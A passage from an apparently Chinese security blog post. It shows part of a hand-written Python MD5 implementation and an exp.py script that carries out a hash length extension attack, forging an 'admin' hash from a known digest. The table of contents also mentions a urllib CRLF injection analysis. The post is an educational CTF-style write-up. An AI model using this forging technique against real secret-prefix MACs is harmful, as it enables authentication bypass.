class="number">7</span>,<span class="number">0x698098d8L</span>)</span><br><span class="line">        d=FF(d,a,b,c,M9,<span class="number">12</span>,<span class="number">0x8b44f7afL</span>)</span><br><span class="line">        c=FF(c,d,a,b,M10,<span class="number">17</span>,<span class="number">0xffff5bb1L</span>)</span><br><span class="line">        b=FF(b,c,d,a,M11,<span class="number">22</span>,<span class="number">0x895cd7beL</span>)</span><br><span class="line">        a=FF(a,b,c,d,M12,<span class="number">7</span>,<span class="number">0x6b901122L</span>)</span><br><span class="line">        d=FF(d,a,b,c,M13,<span class="number">12</span>,<span class="number">0xfd987193L</span>)</span><br><span class="line">        c=FF(c,d,a,b,M14,<span class="number">17</span>,<span class="number">0xa679438eL</span>)</span><br><span class="line">        b=FF(b,c,d,a,M15,<span class="number">22</span>,<span class="number">0x49b40821L</span>)</span><br><span class="line">        <span class="comment">#Second round</span></span><br><span class="line">        a=GG(a,b,c,d,M1,<span class="number">5</span>,<span class="number">0xf61e2562L</span>)</span><br><span class="line">        d=GG(d,a,b,c,M6,<span class="number">9</span>,<span class="number">0xc040b340L</span>)</span><br><span class="line">        c=GG(c,d,a,b,M11,<span class="number">14</span>,<span class="number">0x265e5a51L</span>)</span><br><span class="line">        b=GG(b,c,d,a,M0,<span class="number">20</span>,<span class="number">0xe9b6c7aaL</span>)</span><br><span class="line">        a=GG(a,b,c,d,M5,<span class="number">5</span>,<span class="number">0xd62f105dL</span>)</span><br><span class="line">        d=GG(d,a,b,c,M10,<span class="number">9</span>,<span class="number">0x02441453L</span>)</span><br><span class="line">        c=GG(c,d,a,b,M15,<span class="number">14</span>,<span class="number">0xd8a1e681L</span>)</span><br><span class="line">        b=GG(b,c,d,a,M4,<span class="number">20</span>,<span class="number">0xe7d3fbc8L</span>)</span><br><span class="line">        a=GG(a,b,c,d,M9,<span class="number">5</span>,<span class="number">0x21e1cde6L</span>)</span><br><span class="line">        d=GG(d,a,b,c,M14,<span class="number">9</span>,<span class="number">0xc33707d6L</span>)</span><br><span class="line">        c=GG(c,d,a,b,M3,<span class="number">14</span>,<span class="number">0xf4d50d87L</span>)</span><br><span class="line">        b=GG(b,c,d,a,M8,<span class="number">20</span>,<span class="number">0x455a14edL</span>)</span><br><span class="line">        a=GG(a,b,c,d,M13,<span class="number">5</span>,<span class="number">0xa9e3e905L</span>)</span><br><span class="line">        d=GG(d,a,b,c,M2,<span class="number">9</span>,<span class="number">0xfcefa3f8L</span>)</span><br><span class="line">        c=GG(c,d,a,b,M7,<span class="number">14</span>,<span class="number">0x676f02d9L</span>)</span><br><span class="line">        b=GG(b,c,d,a,M12,<span class="number">20</span>,<span class="number">0x8d2a4c8aL</span>)</span><br><span class="line">        <span class="comment">#Third round</span></span><br><span class="line">        a=HH(a,b,c,d,M5,<span class="number">4</span>,<span class="number">0xfffa3942L</span>)</span><br><span class="line">        d=HH(d,a,b,c,M8,<span class="number">11</span>,<span class="number">0x8771f681L</span>)</span><br><span class="line">        c=HH(c,d,a,b,M11,<span class="number">16</span>,<span class="number">0x6d9d6122L</span>)</span><br><span class="line">        b=HH(b,c,d,a,M14,<span class="number">23</span>,<span class="number">0xfde5380c</span>)</span><br><span class="line">        a=HH(a,b,c,d,M1,<span class="number">4</span>,<span class="number">0xa4beea44L</span>)</span><br><span class="line">        d=HH(d,a,b,c,M4,<span class="number">11</span>,<span class="number">0x4bdecfa9L</span>)</span><br><span class="line">        c=HH(c,d,a,b,M7,<span class="number">16</span>,<span class="number">0xf6bb4b60L</span>)</span><br><span class="line">        b=HH(b,c,d,a,M10,<span class="number">23</span>,<span class="number">0xbebfbc70L</span>)</span><br><span class="line">        a=HH(a,b,c,d,M13,<span class="number">4</span>,<span class="number">0x289b7ec6L</span>)</span><br><span class="line">        d=HH(d,a,b,c,M0,<span class="number">11</span>,<span class="number">0xeaa127faL</span>)</span><br><span class="line">        c=HH(c,d,a,b,M3,<span class="number">16</span>,<span class="number">0xd4ef3085L</span>)</span><br><span class="line">        b=HH(b,c,d,a,M6,<span class="number">23</span>,<span class="number">0x04881d05L</span>)</span><br><span class="line">        a=HH(a,b,c,d,M9,<span class="number">4</span>,<span class="number">0xd9d4d039L</span>)</span><br><span class="line">        d=HH(d,a,b,c,M12,<span class="number">11</span>,<span class="number">0xe6db99e5L</span>)</span><br><span class="line">        c=HH(c,d,a,b,M15,<span class="number">16</span>,<span class="number">0x1fa27cf8L</span>)</span><br><span class="line">        b=HH(b,c,d,a,M2,<span class="number">23</span>,<span class="number">0xc4ac5665L</span>)</span><br><span class="line">        <span class="comment">#Fourth round</span></span><br><span class="line">        a=II(a,b,c,d,M0,<span class="number">6</span>,<span class="number">0xf4292244L</span>)</span><br><span class="line">        d=II(d,a,b,c,M7,<span class="number">10</span>,<span class="number">0x432aff97L</span>)</span><br><span class="line">        c=II(c,d,a,b,M14,<span class="number">15</span>,<span class="number">0xab9423a7L</span>)</span><br><span class="line">        b=II(b,c,d,a,M5,<span class="number">21</span>,<span class="number">0xfc93a039L</span>)</span><br><span class="line">        a=II(a,b,c,d,M12,<span class="number">6</span>,<span class="number">0x655b59c3L</span>)</span><br><span class="line">        d=II(d,a,b,c,M3,<span class="number">10</span>,<span class="number">0x8f0ccc92L</span>)</span><br><span class="line">        c=II(c,d,a,b,M10,<span class="number">15</span>,<span class="number">0xffeff47dL</span>)</span><br><span class="line">        b=II(b,c,d,a,M1,<span class="number">21</span>,<span class="number">0x85845dd1L</span>)</span><br><span class="line">        a=II(a,b,c,d,M8,<span class="number">6</span>,<span class="number">0x6fa87e4fL</span>)</span><br><span class="line">        d=II(d,a,b,c,M15,<span class="number">10</span>,<span class="number">0xfe2ce6e0L</span>)</span><br><span class="line">        c=II(c,d,a,b,M6,<span class="number">15</span>,<span class="number">0xa3014314L</span>)</span><br><span class="line">        b=II(b,c,d,a,M13,<span class="number">21</span>,<span class="number">0x4e0811a1L</span>)</span><br><span class="line">        a=II(a,b,c,d,M4,<span class="number">6</span>,<span class="number">0xf7537e82L</span>)</span><br><span class="line">        d=II(d,a,b,c,M11,<span class="number">10</span>,<span class="number">0xbd3af235L</span>)</span><br><span class="line">        c=II(c,d,a,b,M2,<span class="number">15</span>,<span class="number">0x2ad7d2bbL</span>)</span><br><span class="line">        b=II(b,c,d,a,M9,<span class="number">21</span>,<span class="number">0xeb86d391L</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        A += a</span><br><span class="line">        B += b</span><br><span class="line">        C += c</span><br><span class="line">        D += d</span><br><span class="line"></span><br><span class="line">        A = A&amp;<span class="number">0xffffffff</span></span><br><span class="line">        B = B&amp;<span class="number">0xffffffff</span></span><br><span class="line">        C = C&amp;<span class="number">0xffffffff</span></span><br><span class="line">        D = D&amp;<span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">        a = A</span><br><span class="line">        b = B</span><br><span class="line">        c = C</span><br><span class="line">        d = D</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> show_md5(a,b,c,d)</span><br></pre></td></tr></table></figure>

<h6 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> my_md5</span><br><span class="line">samplehash=<span class="string">"571580b26c65f306376d4f64e53cb5c7"</span></span><br><span class="line">samplehash=<span class="string">"8867c970|50ca95d6|b74a7023|2d6394a6"</span></span><br><span class="line"><span class="comment">#将哈希值分为四段,并反转该四字节为小端序,作为64第二次循环的输入幻书</span></span><br><span class="line"><span class="comment"># s1=0xb2801557</span></span><br><span class="line"><span class="comment"># s2=0x06f3656c</span></span><br><span class="line"><span class="comment"># s3=0x644f6d37</span></span><br><span class="line"><span class="comment"># s4=0xc7b53ce5</span></span><br><span class="line">s1=<span class="number">0x70c96788</span></span><br><span class="line">s2=<span class="number">0xd695ca50</span></span><br><span class="line">s3=<span class="number">0x23704ab7</span></span><br><span class="line">s4=<span class="number">0xa694632d</span></span><br><span class="line"><span class="comment">#exp</span></span><br><span class="line">secret = <span class="string">"A"</span>*<span class="number">15</span></span><br><span class="line">secret_admin = secret + <span class="string">'adminadmin&#123;padding&#125;'</span></span><br><span class="line">padding = <span class="string">'\x80&#123;zero&#125;\xc8\x00\x00\x00\x00\x00\x00\x00'</span>.format(zero=<span class="string">"\x00"</span>*(<span class="number">64</span><span class="number">-15</span><span class="number">-10</span><span class="number">-1</span><span class="number">-8</span>))</span><br><span class="line">secret_admin = secret_admin.format(padding=padding) + <span class="string">'dawn'</span></span><br><span class="line"><span class="keyword">print</span> secret_admin</span><br><span class="line">r = my_md5.deal_rawInputMsg(secret_admin)</span><br><span class="line">inp = r[len(r)/<span class="number">2</span>:] <span class="comment">#我们需要截断的地方，也是我们需要控制的地方</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"getmein:"</span>+my_md5.run_md5(s1,s2,s3,s4,inp)</span><br></pre></td></tr></table></figure>

<h5 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h5><h6 id="https-xz-aliyun-com-t-2563"><a href="#https-xz-aliyun-com-t-2563" class="headerlink" title="https://xz.aliyun.com/t/2563"></a><a href="https://xz.aliyun.com/t/2563" target="_blank" rel="noopener">https://xz.aliyun.com/t/2563</a></h6><h6 id="https-blog-csdn-net-syh-486-007-article-details-51228628"><a href="#https-blog-csdn-net-syh-486-007-article-details-51228628" class="headerlink" title="https://blog.csdn.net/syh_486_007/article/details/51228628"></a><a href="https://blog.csdn.net/syh_486_007/article/details/51228628" target="_blank" rel="noopener">https://blog.csdn.net/syh_486_007/article/details/51228628</a></h6>
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/03/14/nullcon-hackim-2020-ctf的split-seconde的详细分析/" rel="next" title="nullcon hackim 2020 ctf的split seconde的详细分析">
                <i class="fa fa-chevron-left"></i> nullcon hackim 2020 ctf的split seconde的详细分析
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2021/01/28/TetCTF部分web题解/" rel="prev" title="TetCTF部分web题解">
                TetCTF部分web题解 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
            
              <p class="site-author-name" itemprop="name">Ljdd520</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">49</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">10</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                友情链接
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-python-urllib-urllib2-库的漏洞分析"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 python urllib(urllib2)库的漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x001-python-2-7-16"><span class="nav-number">1.1.1.</span> <span class="nav-text">0x001 python 2.7.16</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#测试代码如下："><span class="nav-number">1.1.1.1.</span> <span class="nav-text">测试代码如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#结果如下："><span class="nav-number">1.1.1.2.</span> <span class="nav-text">结果如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们可以看到已经成功的进行了CRLF注入。"><span class="nav-number">1.1.1.3.</span> <span class="nav-text">我们可以看到已经成功的进行了CRLF注入。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x002-python-3-7-3"><span class="nav-number">1.1.2.</span> <span class="nav-text">0x002 python 3.7.3</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#测试代码如下：-1"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">测试代码如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#结果如下：-1"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">结果如下：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x003-已有漏洞的版本"><span class="nav-number">1.1.3.</span> <span class="nav-text">0x003 已有漏洞的版本</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#2-7-16-3-7-3"><span class="nav-number">1.1.3.1.</span> <span class="nav-text">2.7.16~3.7.3</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-nvd-nist-gov-vuln-detail-CVE-2019-9947"><span class="nav-number">1.1.3.2.</span> <span class="nav-text">https://nvd.nist.gov/vuln/detail/CVE-2019-9947</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x004-源码分析："><span class="nav-number">1.1.4.</span> <span class="nav-text">0x004 源码分析：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-hash长度扩展攻击"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 hash长度扩展攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x001-md5简介"><span class="nav-number">1.2.1.</span> <span class="nav-text">0x001 md5简介</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#MD5即Message-Digest-Algorithm-5（信息-摘要算法5），用于确保信息传输完整一致。是计算机广泛使用的杂凑算法之一（又译摘要算法、哈希算法），主流编程语言普遍已有MD5实现。"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">MD5即Message-Digest Algorithm 5（信息-摘要算法5），用于确保信息传输完整一致。是计算机广泛使用的杂凑算法之一（又译摘要算法、哈希算法），主流编程语言普遍已有MD5实现。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#MD5算法具有以下特点："><span class="nav-number">1.2.1.2.</span> <span class="nav-text">MD5算法具有以下特点：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#1、压缩性：任意长度的数据，算出的MD5值长度都是固定的。"><span class="nav-number">1.2.1.3.</span> <span class="nav-text">1、压缩性：任意长度的数据，算出的MD5值长度都是固定的。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2、容易计算：从原数据计算出MD5值很容易。"><span class="nav-number">1.2.1.4.</span> <span class="nav-text">2、容易计算：从原数据计算出MD5值很容易。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3、抗修改性：对原数据进行任何改动，哪怕只修改1个字节，所得到的MD5值都有很大区别。"><span class="nav-number">1.2.1.5.</span> <span class="nav-text">3、抗修改性：对原数据进行任何改动，哪怕只修改1个字节，所得到的MD5值都有很大区别。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4、强抗碰撞：已知原数据和其MD5值，想找到一个具有相同MD5值的数据（即伪造数据）是非常困难的。"><span class="nav-number">1.2.1.6.</span> <span class="nav-text">4、强抗碰撞：已知原数据和其MD5值，想找到一个具有相同MD5值的数据（即伪造数据）是非常困难的。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#MD5的作用是让大容量信息在用数字签名软件签署私人密钥前被”压缩”成一种保密的格式（就是把一个任意长度的字节串变换成一定长的16进制数字串）。"><span class="nav-number">1.2.1.7.</span> <span class="nav-text">MD5的作用是让大容量信息在用数字签名软件签署私人密钥前被”压缩”成一种保密的格式（就是把一个任意长度的字节串变换成一定长的16进制数字串）。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#大家都知道，地球上任何人都有自己独一无二的指纹，这常常成为司法机关鉴别罪犯身份最值得信赖的方法；与之类似，MD5就可以为任何文件（不管其大小、格式、数量）产生一个同样独一无二的MD5“数字指纹”，如果任何人对文件做了任何改动，其MD5也就是对应的“数字指纹”都会发生变化。"><span class="nav-number">1.2.1.8.</span> <span class="nav-text">大家都知道，地球上任何人都有自己独一无二的指纹，这常常成为司法机关鉴别罪犯身份最值得信赖的方法；与之类似，MD5就可以为任何文件（不管其大小、格式、数量）产生一个同样独一无二的MD5“数字指纹”，如果任何人对文件做了任何改动，其MD5也就是对应的“数字指纹”都会发生变化。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x002-md5加密原理步骤"><span class="nav-number">1.2.2.</span> <span class="nav-text">0x002 md5加密原理步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-补充"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">1.补充</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#在MD5算法中，首先需要对信息进行填充，使其位长对512求余的结果等于448，并且填充必须进行，即使其位长对512求余的结果等于448。因此，信息的位长（Bits-Length）将被扩展至N-512-448，N为一个非负整数，N可以是零。"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">在MD5算法中，首先需要对信息进行填充，使其位长对512求余的结果等于448，并且填充必须进行，即使其位长对512求余的结果等于448。因此，信息的位长（Bits Length）将被扩展至N*512+448，N为一个非负整数，N可以是零。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#填充的方法如下："><span class="nav-number">1.2.2.3.</span> <span class="nav-text">填充的方法如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#1-在信息的后面填充一个1和无数个0，直到满足上面的条件时才停止用0对信息的填充。"><span class="nav-number">1.2.2.4.</span> <span class="nav-text">1)在信息的后面填充一个1和无数个0，直到满足上面的条件时才停止用0对信息的填充。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-在这个结果后面附加一个64位二进制表示的填充前信息长度-单位位Bit-，如果二进制表示的填充前信息长度超过64位，则取低位64位。"><span class="nav-number">1.2.2.5.</span> <span class="nav-text">2)在这个结果后面附加一个64位二进制表示的填充前信息长度(单位位Bit)，如果二进制表示的填充前信息长度超过64位，则取低位64位。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#经过这两步的处理，信息的位长-N512-448-64-N-1-512，即长度恰好是512的整数倍。这样做的原因是为满足后面处理中对信息长度的要求。"><span class="nav-number">1.2.2.6.</span> <span class="nav-text">经过这两步的处理，信息的位长=N512+448+64=(N+1)512，即长度恰好是512的整数倍。这样做的原因是为满足后面处理中对信息长度的要求。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-初始化变量"><span class="nav-number">1.2.2.7.</span> <span class="nav-text">2.初始化变量</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#初始的128位值为初试链接变量，这些参数用于第一轮的运算，以大端字节序来表示，他们分别为：-A-0x01234567，B-0x89ABCDEF，C-0xFEDCBA98，D-0x76543210。"><span class="nav-number">1.2.2.8.</span> <span class="nav-text">初始的128位值为初试链接变量，这些参数用于第一轮的运算，以大端字节序来表示，他们分别为： A=0x01234567，B=0x89ABCDEF，C=0xFEDCBA98，D=0x76543210。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#每一个变量给出的数值是高字节存于内存低地址，低字节存于内存高地址，即大端字节序。在程序中变量A、B、C、D的值分别为0x67452301，0xEFCDAB89，0x98BADCFE，0x10325476"><span class="nav-number">1.2.2.9.</span> <span class="nav-text">(每一个变量给出的数值是高字节存于内存低地址，低字节存于内存高地址，即大端字节序。在程序中变量A、B、C、D的值分别为0x67452301，0xEFCDAB89，0x98BADCFE，0x10325476)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-处理分组数据"><span class="nav-number">1.2.2.10.</span> <span class="nav-text">3.处理分组数据</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#每一分组的算法流程如下："><span class="nav-number">1.2.2.11.</span> <span class="nav-text">每一分组的算法流程如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#第一分组需要将上面四个链接变量复制到另外四个变量中：A到a，B到b，C到c，D到d。从第二分组开始的变量为上一分组的运算结果，即A-a，-B-b，-C-c，-D-d。"><span class="nav-number">1.2.2.12.</span> <span class="nav-text">第一分组需要将上面四个链接变量复制到另外四个变量中：A到a，B到b，C到c，D到d。从第二分组开始的变量为上一分组的运算结果，即A = a， B = b， C = c， D = d。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#主循环有四轮（MD4只有三轮），每轮循环都很相似。第一轮进行16次操作。每次操作对a、b、c和d中的其中三个作一次非线性函数运算，然后将所得结果加上第四个变量，文本的一个子分组和一个常数。再将所得结果向左环移一个不定的数，并加上a、b、c或d中之一。最后用该结果取代a、b、c或d中之一。"><span class="nav-number">1.2.2.13.</span> <span class="nav-text">主循环有四轮（MD4只有三轮），每轮循环都很相似。第一轮进行16次操作。每次操作对a、b、c和d中的其中三个作一次非线性函数运算，然后将所得结果加上第四个变量，文本的一个子分组和一个常数。再将所得结果向左环移一个不定的数，并加上a、b、c或d中之一。最后用该结果取代a、b、c或d中之一。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#以下是每次操作中用到的四个非线性函数（每轮一个）。"><span class="nav-number">1.2.2.14.</span> <span class="nav-text">以下是每次操作中用到的四个非线性函数（每轮一个）。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#amp-是与-And-，-是或-Or-，-是非-Not-，-是异或-Xor"><span class="nav-number">1.2.2.15.</span> <span class="nav-text">(&amp;是与(And)，|是或(Or)，~是非(Not)，^是异或(Xor))</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这四个函数的说明：如果X、Y和Z的对应位是独立和均匀的，那么结果的每一位也应是独立和均匀的。"><span class="nav-number">1.2.2.16.</span> <span class="nav-text">这四个函数的说明：如果X、Y和Z的对应位是独立和均匀的，那么结果的每一位也应是独立和均匀的。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#F是一个逐位运算的函数。即，如果X，那么Y，否则Z。函数H是逐位奇偶操作符。"><span class="nav-number">1.2.2.17.</span> <span class="nav-text">F是一个逐位运算的函数。即，如果X，那么Y，否则Z。函数H是逐位奇偶操作符。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#假设Mj表示消息的第j个子分组-从0到15-，常数ti是4294967296-abs-sin-i-的整数部分，i取值从1到64，单位是弧度。-4294967296-2的32次方"><span class="nav-number">1.2.2.18.</span> <span class="nav-text">假设Mj表示消息的第j个子分组(从0到15)，常数ti是4294967296*abs(sin(i))的整数部分，i取值从1到64，单位是弧度。(4294967296=2的32次方)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#现定义："><span class="nav-number">1.2.2.19.</span> <span class="nav-text">现定义：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#注意：-lt-lt-表示循环左移位，不是左移位。"><span class="nav-number">1.2.2.20.</span> <span class="nav-text">注意：&lt;&lt;表示循环左移位，不是左移位。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这四轮-64步-是："><span class="nav-number">1.2.2.21.</span> <span class="nav-text">这四轮(64步)是：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#第一轮"><span class="nav-number">1.2.2.22.</span> <span class="nav-text">第一轮</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#第二轮"><span class="nav-number">1.2.2.23.</span> <span class="nav-text">第二轮</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#第三轮"><span class="nav-number">1.2.2.24.</span> <span class="nav-text">第三轮</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#第四轮"><span class="nav-number">1.2.2.25.</span> <span class="nav-text">第四轮</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#所有这些完成之后，将a、b、c、d分别在原来基础上再加上A、B、C、D。"><span class="nav-number">1.2.2.26.</span> <span class="nav-text">所有这些完成之后，将a、b、c、d分别在原来基础上再加上A、B、C、D。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#即a-a-A，b-b-B，c-c-C，d-d-D"><span class="nav-number">1.2.2.27.</span> <span class="nav-text">即a = a + A，b = b + B，c = c + C，d = d + D</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#然后用下一分组数据继续运行以上算法。"><span class="nav-number">1.2.2.28.</span> <span class="nav-text">然后用下一分组数据继续运行以上算法。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4-输出"><span class="nav-number">1.2.2.29.</span> <span class="nav-text">4.输出</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#最后的输出是a、b、c和d的级联。"><span class="nav-number">1.2.2.30.</span> <span class="nav-text">最后的输出是a、b、c和d的级联。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#当你按照我上面所说的方法实现MD5算法以后，你可以用以下几个信息对你做出来的程序作一个简单的测试，看看程序有没有错误。"><span class="nav-number">1.2.2.31.</span> <span class="nav-text">当你按照我上面所说的方法实现MD5算法以后，你可以用以下几个信息对你做出来的程序作一个简单的测试，看看程序有没有错误。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#MD5-“”-d41d8cd98f00b204e9800998ecf8427e"><span class="nav-number">1.2.2.32.</span> <span class="nav-text">MD5(“”) = d41d8cd98f00b204e9800998ecf8427e</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#MD5-“a”-0cc175b9c0f1b6a831c399e269772661"><span class="nav-number">1.2.2.33.</span> <span class="nav-text">MD5(“a”) = 0cc175b9c0f1b6a831c399e269772661</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#MD5-“abc”-900150983cd24fb0d6963f7d28e17f72"><span class="nav-number">1.2.2.34.</span> <span class="nav-text">MD5(“abc”) = 900150983cd24fb0d6963f7d28e17f72</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#MD5-“message-digest”-f96b697d7cb7938d525a2f31aaf161d0"><span class="nav-number">1.2.2.35.</span> <span class="nav-text">MD5(“message digest”) = f96b697d7cb7938d525a2f31aaf161d0</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#MD5-“abcdefghijklmnopqrstuvwxyz”-c3fcd3d76192e4007dfb496cca67e13b"><span class="nav-number">1.2.2.36.</span> <span class="nav-text">MD5(“abcdefghijklmnopqrstuvwxyz”) = c3fcd3d76192e4007dfb496cca67e13b</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#MD5-“ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz”"><span class="nav-number">1.2.2.37.</span> <span class="nav-text">MD5(“ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz”) =</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#f29939a25efabaef3b87e2cbfe641315"><span class="nav-number">1.2.2.38.</span> <span class="nav-text">f29939a25efabaef3b87e2cbfe641315</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#MD5-“8a683566bcc7801226b3d8b0cf35fd97”-cf2cb5c89c5e5eeebef4a76becddfcfd"><span class="nav-number">1.2.2.39.</span> <span 